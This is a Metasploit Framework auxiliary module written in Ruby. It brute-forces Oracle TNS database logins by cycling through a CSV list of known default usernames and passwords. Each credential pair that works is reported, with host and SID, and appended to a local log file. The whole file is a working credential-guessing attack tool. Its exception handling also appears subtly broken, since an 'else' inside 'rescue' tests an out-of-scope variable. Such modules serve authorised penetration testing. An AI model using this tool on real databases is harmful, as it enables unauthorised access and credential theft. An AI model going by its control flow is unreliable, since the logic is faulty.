##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'
require 'csv'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::ORACLE
	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle brute forcer for known default accounts.',
			'Description'    => %q{
				This module uses a list of well known authentication credentials
				for bruteforcing the TNS service. A log file of discoverd credentials 
				can be found in ./data/wordlists/oracle_default_found.log. 
				Oracle default passwords in oracle_default_passwords.csv.
				McKesson HCI Oracle default passwords in hci_oracle_passwords.csv.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'https://www.metasploit.com/users/mc' ],
					[ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv' ],
					[ 'URL', 'http://seclists.org/fulldisclosure/2009/Oct/261' ],
				],
			'DisclosureDate' => 'Nov 20 2008'))

			register_options(
				[
					OptString.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),
				], self.class)

			deregister_options('DBUSER','DBPASS')

	end

	def run
		list = datastore['CSVFILE']

		fd = CSV.foreach(list).each do |brute|

		datastore['DBUSER'] = brute[2]
		datastore['DBPASS'] = brute[3]

		begin
			c = connect
			c.disconnect
		rescue ::Exception => e
			
			else
				if (not e)
					report_note(
						:host  => datastore['RHOST'],
						:proto => 'tcp',
						:port  => datastore['RPORT'],
						:type  => 'ORACLE_BRUTEFORCED_ACCOUNT',
						:data  => "#{datastore['DBUSER']}/#{datastore['DBPASS']} with sid #{datastore['SID']}"
					)
					found = File.new("./data/wordlists/oracle_default_found.log","a")
						print_status("Found user/pass of: #{datastore['DBUSER']}/#{datastore['DBPASS']} on #{datastore['RHOST']} with sid #{datastore['SID']}")
						found.write "Found user/pass of: #{datastore['DBUSER']}/#{datastore['DBPASS']} on #{datastore['RHOST']} with sid #{datastore['SID']}.\n"
					found.close
				end 
		end
		end
	end
end
